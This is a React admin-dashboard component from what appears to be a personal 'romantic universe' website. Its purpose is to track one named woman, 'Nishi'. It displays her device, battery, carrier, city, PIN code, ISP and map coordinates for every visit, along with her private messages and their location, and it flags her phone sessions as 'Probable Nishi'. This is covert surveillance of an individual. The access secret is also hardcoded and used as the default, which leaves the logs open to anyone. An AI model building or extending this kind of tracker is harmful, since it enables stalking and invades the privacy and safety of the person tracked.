import React, { useState, useEffect } from 'react';

export default function AdminDashboard({ onClose }) {
  const [sessions, setSessions] = useState([]);
  const [whispers, setWhispers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [activeSecret, setActiveSecret] = useState('niraj6120');

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      const secret = (params.get('secret') || params.get('admin') || 'niraj6120').trim().toLowerCase();
      setActiveSecret(secret);
    }
  }, []);

  const fetchLogs = async () => {
    setLoading(true);

    try {
      const secretParam = activeSecret || 'niraj6120';
      const res = await fetch(`/api/track?secret=${secretParam}`);
      if (res.ok) {
        const data = await res.json();
        setSessions(data.sessions || []);
        setWhispers(data.whispers || []);
      } else {
        loadFromLocalStorage();
      }
    } catch (err) {
      loadFromLocalStorage();
    } finally {
      setLoading(false);
    }
  };

  const loadFromLocalStorage = () => {
    try {
      const localSessions = JSON.parse(localStorage.getItem('nishi_universe_sessions') || '{}');
      setSessions(Object.values(localSessions));

      const localWhispers = JSON.parse(localStorage.getItem('nishi_universe_whispers') || '[]');
      setWhispers(localWhispers);
    } catch (e) {
      setSessions([]);
      setWhispers([]);
    }
  };

  const clearTestLogs = async () => {
    if (!window.confirm('Clear past test session logs? This allows you to have a 100% clean dashboard ready for Nishi.')) {
      return;
    }

    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'clear_test_logs', secret: activeSecret })
      });
      fetchLogs();
    } catch (e) {
      alert('Could not clear logs. Check network connection.');
    }
  };

  useEffect(() => {
    fetchLogs();
  }, [activeSecret]);

  const totalSessions = sessions.length;
  const mobileCount = sessions.filter((s) => (
    s.deviceType ? s.deviceType !== 'desktop' : /iPhone|Android|iPad|Phone|Tablet/i.test(`${s.device || ''} ${s.os || ''}`)
  )).length;

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(5, 2, 10, 0.97)',
        backdropFilter: 'blur(25px)',
        WebkitBackdropFilter: 'blur(25px)',
        zIndex: 99999,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '24px 16px',
        overflowY: 'auto',
        color: '#ffffff',
        fontFamily: "'Plus Jakarta Sans', sans-serif"
      }}
    >
      {/* Top Header Bar */}
      <div
        style={{
          width: '100%',
          maxWidth: '1200px',
          display: 'flex',
          flexWrap: 'wrap',
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: '12px',
          marginBottom: '20px',
          borderBottom: '1px solid rgba(255, 117, 143, 0.25)',
          paddingBottom: '16px'
        }}
      >
        <div>
          <h2
            style={{
              fontFamily: "'Cinzel', serif",
              fontSize: 'clamp(1.3rem, 4vw, 1.8rem)',
              fontWeight: 700,
              background: 'linear-gradient(135deg, #ffffff, #ff758f)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              marginBottom: '4px'
            }}
          >
            Visitor Intelligence Dashboard
          </h2>
          <p style={{ fontSize: '0.82rem', color: 'rgba(255, 209, 225, 0.75)' }}>
            Live tracking for Nishi's Romantic Universe on Vercel
          </p>
        </div>

        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px' }}>
          <button
            onClick={fetchLogs}
            style={{
              padding: '8px 16px',
              borderRadius: '12px',
              background: 'rgba(255, 45, 117, 0.25)',
              border: '1px solid rgba(255, 117, 143, 0.5)',
              color: '#ffffff',
              fontSize: '0.85rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px'
            }}
          >
            <span>🔄</span>
            <span>Refresh</span>
          </button>

          <button
            onClick={clearTestLogs}
            style={{
              padding: '8px 14px',
              borderRadius: '12px',
              background: 'rgba(239, 68, 68, 0.15)',
              border: '1px solid rgba(239, 68, 68, 0.35)',
              color: '#fca5a5',
              fontSize: '0.82rem',
              cursor: 'pointer'
            }}
          >
            🗑️ Clear Test Logs
          </button>

          <button
            onClick={onClose}
            style={{
              padding: '8px 16px',
              borderRadius: '12px',
              background: 'rgba(255, 255, 255, 0.12)',
              border: '1px solid rgba(255, 255, 255, 0.3)',
              color: '#ffffff',
              fontSize: '0.85rem',
              cursor: 'pointer'
            }}
          >
            ✕ Close View
          </button>
        </div>
      </div>

      {/* 💡 VISITOR IDENTIFICATION GUIDE BANNER */}
      <div
        style={{
          width: '100%',
          maxWidth: '1200px',
          background: 'rgba(30, 10, 45, 0.7)',
          border: '1px solid rgba(255, 117, 143, 0.3)',
          borderRadius: '14px',
          padding: '12px 18px',
          marginBottom: '20px',
          display: 'flex',
          flexWrap: 'wrap',
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: '10px',
          fontSize: '0.8rem',
          color: 'rgba(255, 230, 240, 0.9)'
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ fontSize: '1.2rem' }}>🌸</span>
          <span>
            <strong>How to identify Nishi:</strong> Look for the <strong>"🌸 Probable Nishi 💕"</strong> badge! Her session will show her <strong>Mobile Phone</strong> (iPhone or Android), her <strong>City & PIN code</strong>, and cellular network (Jio/Airtel).
          </span>
        </div>
        <div style={{ fontSize: '0.74rem', color: '#ffd166', background: 'rgba(255, 209, 102, 0.12)', padding: '4px 10px', borderRadius: '6px' }}>
          ✨ Your own admin PC checks are automatically excluded
        </div>
      </div>

      {/* 💌 WHISPERS FROM NISHI (HIGHLIGHT SECTION) */}
      <div
        style={{
          width: '100%',
          maxWidth: '1200px',
          background: 'rgba(255, 45, 117, 0.1)',
          border: '1px solid rgba(255, 117, 143, 0.4)',
          borderRadius: '20px',
          padding: '22px',
          marginBottom: '24px',
          boxShadow: '0 10px 30px rgba(255, 45, 117, 0.15)'
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
          <span style={{ fontSize: '1.4rem' }}>💌</span>
          <h3 style={{ fontSize: '1.2rem', fontWeight: 600, color: '#ffffff' }}>
            Whispers from Nishi ({whispers.length})
          </h3>
        </div>

        {whispers.length === 0 ? (
          <p style={{ fontSize: '0.85rem', color: 'rgba(255, 220, 235, 0.7)', fontStyle: 'italic' }}>
            No whispers received yet. When she writes in the message box at the bottom of the site, her note will appear here instantly!
          </p>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {whispers.map((w) => (
              <div
                key={w.id}
                style={{
                  background: 'rgba(15, 6, 26, 0.85)',
                  border: '1px solid rgba(255, 117, 143, 0.3)',
                  borderRadius: '16px',
                  padding: '16px 20px'
                }}
              >
                <p
                  style={{
                    fontFamily: "'Cormorant Garamond', Georgia, serif",
                    fontSize: '1.25rem',
                    fontStyle: 'italic',
                    color: '#ffffff',
                    marginBottom: '8px'
                  }}
                >
                  "{w.text}"
                </p>
                <div style={{ display: 'flex', flexWrap: 'wrap', alignItems: 'center', gap: '14px', fontSize: '0.75rem', color: 'rgba(255, 182, 193, 0.85)' }}>
                  <span>🕒 {w.time} ({w.date})</span>
                  {w.device && <span>📱 {w.device}</span>}
                  {w.location && <span>📍 {w.location}</span>}
                  {w.mapsUrl && (
                    <a
                      href={w.mapsUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{
                        color: '#60a5fa',
                        textDecoration: 'none',
                        background: 'rgba(96, 165, 250, 0.15)',
                        border: '1px solid rgba(96, 165, 250, 0.3)',
                        padding: '2px 8px',
                        borderRadius: '6px'
                      }}
                    >
                      🗺️ Open on Google Maps ↗
                    </a>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Top Metric Cards */}
      <div
        style={{
          width: '100%',
          maxWidth: '1200px',
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
          gap: '16px',
          marginBottom: '24px'
        }}
      >
        <div style={{ background: 'rgba(255, 45, 117, 0.08)', border: '1px solid rgba(255, 117, 143, 0.3)', borderRadius: '16px', padding: '18px' }}>
          <span style={{ fontSize: '0.75rem', letterSpacing: '0.15em', textTransform: 'uppercase', color: '#ff758f' }}>
            TOTAL VISITING SESSIONS
          </span>
          <div style={{ fontSize: '2.2rem', fontWeight: 700, marginTop: '6px' }}>{totalSessions}</div>
        </div>

        <div style={{ background: 'rgba(157, 78, 221, 0.08)', border: '1px solid rgba(157, 78, 221, 0.3)', borderRadius: '16px', padding: '18px' }}>
          <span style={{ fontSize: '0.75rem', letterSpacing: '0.15em', textTransform: 'uppercase', color: '#c77dff' }}>
            MOBILE PHONES (NISHI)
          </span>
          <div style={{ fontSize: '2.2rem', fontWeight: 700, marginTop: '6px' }}>
            {mobileCount} <span style={{ fontSize: '0.9rem', color: '#e0aaff' }}>({totalSessions ? Math.round((mobileCount / totalSessions) * 100) : 0}%)</span>
          </div>
        </div>

        <div style={{ background: 'rgba(255, 209, 102, 0.08)', border: '1px solid rgba(255, 209, 102, 0.3)', borderRadius: '16px', padding: '18px' }}>
          <span style={{ fontSize: '0.75rem', letterSpacing: '0.15em', textTransform: 'uppercase', color: '#ffd166' }}>
            DESKTOP COMPUTERS
          </span>
          <div style={{ fontSize: '2.2rem', fontWeight: 700, marginTop: '6px' }}>{totalSessions - mobileCount}</div>
        </div>
      </div>

      {/* DISTINCT SESSION TIMELINE TABLE */}
      <div
        style={{
          width: '100%',
          maxWidth: '1200px',
          background: 'rgba(15, 6, 26, 0.75)',
          border: '1px solid rgba(255, 117, 143, 0.25)',
          borderRadius: '20px',
          padding: '24px',
          boxShadow: '0 15px 40px rgba(0, 0, 0, 0.6)'
        }}
      >
        <div style={{ marginBottom: '16px' }}>
          <h3 style={{ fontSize: '1.15rem', color: '#ffffff', marginBottom: '4px' }}>
            Distinct Visitor Sessions & Duration Breakdown
          </h3>
          <p style={{ fontSize: '0.8rem', color: 'rgba(255, 209, 225, 0.7)' }}>
            Each return visit is logged as a separate session with browser version, operating system, device model, display, language, and location.
          </p>
        </div>

        {loading ? (
          <div style={{ padding: '40px', textAlign: 'center', color: '#ff758f' }}>
            Loading sessions...
          </div>
        ) : sessions.length === 0 ? (
          <div style={{ padding: '40px', textAlign: 'center', color: 'rgba(255, 255, 255, 0.6)' }}>
            No visitor sessions recorded yet. Waiting for Nishi to open the romantic universe!
          </div>
        ) : (
          <div style={{ overflowX: 'auto' }}>
            <table style={{ width: '100%', minWidth: '1080px', borderCollapse: 'collapse', fontSize: '0.84rem' }}>
              <thead>
                <tr style={{ borderBottom: '1px solid rgba(255, 255, 255, 0.15)', textAlign: 'left', color: 'rgba(255, 182, 193, 0.85)' }}>
                  <th style={{ padding: '12px 10px' }}>Visitor Identity</th>
                  <th style={{ padding: '12px 10px' }}>Start Time</th>
                  <th style={{ padding: '12px 10px' }}>Duration Spent</th>
                  <th style={{ padding: '12px 10px' }}>Device & OS</th>
                  <th style={{ padding: '12px 10px' }}>Network & Battery</th>
                  <th style={{ padding: '12px 10px' }}>Location & Google Maps</th>
                  <th style={{ padding: '12px 10px' }}>Milestones</th>
                </tr>
              </thead>
              <tbody>
                {sessions.map((s, index) => {
                  const nowMs = Date.now();
                  const lastActiveMs = s.lastActiveTimestamp ? new Date(s.lastActiveTimestamp).getTime() : 0;
                  const isStillActive = s.status !== 'completed' && lastActiveMs > 0 && (nowMs - lastActiveMs) < 45000;
                  const isMobile = s.deviceType
                    ? s.deviceType !== 'desktop'
                    : /iPhone|Android|iPad|Phone|Tablet/i.test(`${s.device || ''} ${s.os || ''}`);
                  const appleDevice = /iPhone|iPad|iOS|iPadOS|Apple/i.test(`${s.device || ''} ${s.os || ''} ${s.deviceVendor || ''}`);

                  const mapsLink = s.mapsUrl || (s.latitude && s.longitude ? `https://www.google.com/maps?q=${s.latitude},${s.longitude}` : (s.city ? `https://www.google.com/maps?q=${encodeURIComponent((s.city || '') + ' ' + (s.postal || '') + ' India')}` : null));

                  return (
                    <tr
                      key={s.sessionId || index}
                      style={{
                        borderBottom: '1px solid rgba(255, 255, 255, 0.06)',
                        background: isMobile ? 'rgba(255, 45, 117, 0.06)' : 'transparent'
                      }}
                    >
                      {/* 1. Identity Badge */}
                      <td style={{ padding: '14px 10px', whiteSpace: 'nowrap' }}>
                        {isMobile ? (
                          <div style={{ display: 'inline-flex', flexDirection: 'column', gap: '4px' }}>
                            <span
                              style={{
                                padding: '3px 8px',
                                borderRadius: '6px',
                                fontSize: '0.72rem',
                                background: 'rgba(255, 45, 117, 0.25)',
                                border: '1px solid #ff758f',
                                color: '#ff758f',
                                fontWeight: 700
                              }}
                            >
                              🌸 Probable Nishi 💕
                            </span>
                            <span style={{ fontSize: '0.68rem', color: 'rgba(255, 255, 255, 0.6)' }}>
                              Mobile Touchscreen
                            </span>
                          </div>
                        ) : (
                          <span
                            style={{
                              padding: '3px 8px',
                              borderRadius: '6px',
                              fontSize: '0.7rem',
                              background: 'rgba(255, 255, 255, 0.1)',
                              border: '1px solid rgba(255, 255, 255, 0.2)',
                              color: 'rgba(255, 255, 255, 0.7)'
                            }}
                          >
                            💻 Desktop PC
                          </span>
                        )}
                      </td>

                      {/* 2. Session Start Time */}
                      <td style={{ padding: '14px 10px', color: '#ffffff', whiteSpace: 'nowrap' }}>
                        <div style={{ fontWeight: 600 }}>{s.startTime}</div>
                        <div style={{ fontSize: '0.72rem', color: 'rgba(255, 255, 255, 0.5)' }}>{s.date}</div>
                      </td>

                      {/* 3. Duration Spent */}
                      <td style={{ padding: '14px 10px', whiteSpace: 'nowrap' }}>
                        {isStillActive ? (
                          <span
                            style={{
                              padding: '4px 10px',
                              borderRadius: '8px',
                              background: 'rgba(74, 222, 128, 0.2)',
                              border: '1px solid #4ade80',
                              color: '#4ade80',
                              fontWeight: 600,
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '6px'
                            }}
                          >
                            <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#4ade80' }} />
                            🟢 Active ({s.durationFormatted || (s.durationSeconds ? `${s.durationSeconds}s` : '10s')})
                          </span>
                        ) : (
                          <div>
                            <span
                              style={{
                                padding: '4px 10px',
                                borderRadius: '8px',
                                background: 'rgba(255, 209, 102, 0.15)',
                                border: '1px solid rgba(255, 209, 102, 0.4)',
                                color: '#ffd166',
                                fontWeight: 600
                              }}
                            >
                              ⏱️ {s.durationFormatted || (s.durationSeconds ? `${s.durationSeconds}s` : 'Completed')}
                            </span>
                            <div style={{ fontSize: '0.68rem', color: 'rgba(255, 255, 255, 0.5)', marginTop: '4px' }}>
                              Left at {s.endedAt || s.lastActiveTime}
                            </div>
                          </div>
                        )}
                      </td>

                      {/* 4. Device & OS */}
                      <td style={{ padding: '14px 10px', minWidth: '240px' }}>
                        <div style={{ color: '#ffffff', fontWeight: 600, whiteSpace: 'nowrap' }}>
                          {isMobile ? (appleDevice ? '📱 ' : '🤖 ') : '💻 '}
                          {s.device}
                        </div>
                        <div style={{ fontSize: '0.74rem', color: 'rgba(255, 255, 255, 0.6)', whiteSpace: 'nowrap' }}>
                          {s.os} • {s.browser}
                        </div>
                        {s.browserEngine && (
                          <div style={{ fontSize: '0.7rem', color: 'rgba(255, 255, 255, 0.45)', whiteSpace: 'nowrap' }}>
                            {s.browserEngine}
                            {s.architecture ? ` · ${s.architecture}${s.bitness ? ` ${s.bitness}-bit` : ''}` : ''}
                            {s.memoryGb ? ` · ${s.memoryGb} GB` : ''}
                          </div>
                        )}
                        <div style={{ fontSize: '0.7rem', color: 'rgba(255, 255, 255, 0.4)', whiteSpace: 'nowrap' }}>
                          {s.screen}
                          {s.viewport ? ` · view ${s.viewport}` : ''}
                          {s.pixelRatio ? ` · ${s.pixelRatio}x` : ''}
                        </div>
                        {(s.language || s.timeZone) && (
                          <div style={{ fontSize: '0.7rem', color: 'rgba(255, 255, 255, 0.4)', whiteSpace: 'nowrap' }}>
                            {[s.language, s.timeZone].filter(Boolean).join(' · ')}
                          </div>
                        )}
                      </td>

                      {/* 5. Network (5G/4G) & Battery */}
                      <td style={{ padding: '14px 10px', fontSize: '0.78rem' }}>
                        {/* Network */}
                        <div
                          style={{
                            fontWeight: 600,
                            color: /5g/i.test(s.network || '') ? '#38bdf8' : /4g/i.test(s.network || '') ? '#c084fc' : '#e0aaff',
                            marginBottom: '3px'
                          }}
                        >
                          📶 {s.network || 'Cellular / Wi-Fi'}
                        </div>

                        {/* Battery */}
                        <div
                          style={{
                            color: s.battery?.includes('Charging') ? '#4ade80' : 'rgba(255, 255, 255, 0.8)'
                          }}
                        >
                          🔋 {s.battery || (isMobile ? 'iOS Protected' : 'AC Power')}
                        </div>
                      </td>

                      {/* 6. Location, PIN Code & Google Maps */}
                      <td style={{ padding: '14px 10px' }}>
                        <div style={{ color: '#ff758f', fontWeight: 600 }}>
                          📍 {s.city || 'City'}{s.region ? `, ${s.region}` : ''}
                        </div>

                        {s.postal && (
                          <div style={{ fontSize: '0.72rem', color: '#ffd166', fontWeight: 500 }}>
                            PIN Code: {s.postal}
                          </div>
                        )}

                        {s.isp && s.isp !== 'Telecom / Wi-Fi' && (
                          <div style={{ fontSize: '0.72rem', color: 'rgba(255, 255, 255, 0.6)' }}>
                            ISP: {s.isp}
                          </div>
                        )}

                        {mapsLink && (
                          <a
                            href={mapsLink}
                            target="_blank"
                            rel="noopener noreferrer"
                            style={{
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '4px',
                              marginTop: '6px',
                              fontSize: '0.72rem',
                              color: '#60a5fa',
                              textDecoration: 'none',
                              background: 'rgba(96, 165, 250, 0.15)',
                              border: '1px solid rgba(96, 165, 250, 0.3)',
                              padding: '2px 8px',
                              borderRadius: '6px'
                            }}
                          >
                            🗺️ Open in Google Maps ↗
                          </a>
                        )}
                      </td>

                      {/* 7. Milestones Reached */}
                      <td style={{ padding: '14px 10px' }}>
                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '4px' }}>
                          {(s.actions || ['page_view']).map((act, i) => (
                            <span
                              key={i}
                              style={{
                                padding: '2px 8px',
                                borderRadius: '9999px',
                                fontSize: '0.7rem',
                                background: act === 'love_shower_sent'
                                  ? 'rgba(255, 45, 117, 0.35)'
                                  : act === 'whisper_message'
                                  ? 'rgba(255, 209, 102, 0.3)'
                                  : 'rgba(255, 255, 255, 0.1)',
                                border: '1px solid rgba(255, 255, 255, 0.2)',
                                color: '#ffffff'
                              }}
                            >
                              {act}
                            </span>
                          ))}
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Secret URL Footer Note */}
      <div style={{ marginTop: '24px', textAlign: 'center', fontSize: '0.8rem', color: 'rgba(255, 255, 255, 0.5)' }}>
        🔒 Access anytime: add <code>?secret={activeSecret}</code> to your website URL.
      </div>
    </div>
  );
}

